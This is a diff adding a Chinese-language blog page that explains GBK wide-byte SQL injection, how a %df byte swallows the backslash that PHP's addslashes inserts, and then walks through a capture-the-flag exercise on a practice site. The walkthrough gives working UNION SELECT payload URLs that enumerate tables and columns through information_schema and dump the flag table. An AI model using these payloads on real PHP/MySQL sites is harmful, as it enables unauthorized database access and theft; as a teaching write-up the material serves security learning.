@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+  <meta name="author" content="pigstars7">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="宽字节注入">
+  <meta property="og:description" content="">
+  <meta property="og:site_name" content="IMPROVE IN HERE">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="IMPROVE IN HERE" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>IMPROVE IN HERE</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">宽字节注入</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  All
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/pigstars7">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:879399341@qq.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By pigstars7</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2018-11-28</span>
+            <span class="time">21:48:47</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/技术/">技术</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+          <div class="post-tags text-muted">
+            Tags: 
+
+<a class="tag" href="/tags/SQL注入/">#SQL注入</a>
+
+
+          </div>
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          
+<p>关于宽字节注入的一些小记</p>
+
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="0X01-原理"><a href="#0X01-原理" class="headerlink" title="0X01 原理"></a>0X01 原理</h2><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围），示例如下图：</p>
+<p><img src="https://s1.ax1x.com/2018/11/28/FVqUyV.png" alt="FVqUyV.png"></p>
+<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。如上图所示%df’被PHP转义，单引号被加上反斜杠\，变成了%d\’，其中\的十六进制是%5C，那么现在%d\’=%d%5C%27,如果程序的默认字符集是GBK等宽字节字符集，则MYSQL用GBK编码时，会认为%df%5C是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就可以注入了。</p>
+<h3 id="字符、字符集"><a href="#字符、字符集" class="headerlink" title="字符、字符集"></a>字符、字符集</h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
+<h3 id="UTF8"><a href="#UTF8" class="headerlink" title="UTF8"></a>UTF8</h3><p>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</p>
+<h3 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>
+<h2 id="0X02-相关小记"><a href="#0X02-相关小记" class="headerlink" title="0X02  相关小记"></a>0X02  相关小记</h2><p><strong>URL转码</strong></p>
+<p>‘   ——&gt;  %27</p>
+<p>空格  ——&gt;  %20</p>
+<p>#符号  ——&gt;  %23</p>
+<p>\       ——&gt;   %5C</p>
+<p><strong>addslashes函数：</strong></p>
+<p><a href="https://imgchr.com/i/FVvA29" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FVvA29.md.png" alt="FVvA29.md.png"></a></p>
+<p><strong>如何从addslashes函数逃逸出来？</strong></p>
+<p>1.\前面再加一个\（或单数个），变成\ \ ‘,这样\被转义了，’逃出了限制</p>
+<p>2.把\弄没</p>
+<h2 id="0X03-例题解析"><a href="#0X03-例题解析" class="headerlink" title="0X03 例题解析"></a>0X03 例题解析</h2><p>题目地址<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<p>1.先测试是否可以注入</p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#39; and 1=1 -- -</code></p>
+<p><a href="https://imgchr.com/i/FZp0wq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FZp0wq.md.png" alt="FZp0wq.md.png"></a></p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#39; and 1=2 -- -</code></p>
+<p><a href="https://imgchr.com/i/FZpBT0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FZpBT0.md.png" alt="FZpBT0.md.png"></a></p>
+<p>可以看出，可以注入。</p>
+<p>2.继续注入</p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#39; and 1=2 union select 1,concat_ws(0x7c,user(),database(),version()) -- -</code></p>
+<p><a href="https://imgchr.com/i/FZprkV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FZprkV.md.png" alt="FZprkV.md.png"></a></p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#39; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572-- -</code></p>
+<p>sae-chinalover十六进制是0x7361652d6368696e616c6f766572，用十六进制来绕过字符转义</p>
+<p><a href="https://imgchr.com/i/FZp26J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FZp26J.md.png" alt="FZp26J.md.png"></a></p>
+<p>3.在文件里找到flag即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&apos; and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746632 and table_schema=0x7361652d6368696e616c6f766572-- -</span><br></pre></td></tr></table></figure>
+<p><a href="https://imgchr.com/i/FZpcpF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FZpcpF.md.png" alt="FZpcpF.md.png"></a></p>
+<p><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df&#39; and 1=2 union select 1,group_concat(id,content) from ctf2-- -</code></p>
+<p><a href="https://imgchr.com/i/FZ93u9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FZ93u9.md.png" alt="FZ93u9.md.png"></a>思路是对的，也找出来flag了，但是真正的flag是nctf{gbk_3sqli}，可能出了点小问题。但是考点和思路都是宽字节注入，仅供参考。 </p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
